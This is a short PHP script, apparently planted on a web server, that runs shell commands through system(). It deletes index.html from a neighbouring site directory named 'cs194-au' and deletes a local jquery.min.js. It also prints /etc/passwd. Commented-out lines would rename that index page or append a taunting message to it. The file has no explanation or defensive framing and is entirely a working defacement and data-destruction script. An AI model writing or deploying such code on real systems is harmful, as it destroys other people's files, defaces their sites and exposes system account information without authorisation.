<?php
echo system('ls ../cs194-au/*');
echo system('rm ../cs194-au/index.html');
echo '<br/>';
echo system('ls .');
system('rm ./jquery.min.js');
echo '<br/>';

//system('mv ../cs194-au/index.html ../cs194-au/index2.html');
//echo system('cat ../cs194-au/index.html');
//echo system('echo "YOOO WATS UP MAYNE ELKJLSDJFLJSDJFLKDFLJ" >> ../cs194-au/index.html');
echo system('cat /etc/passwd');
?>
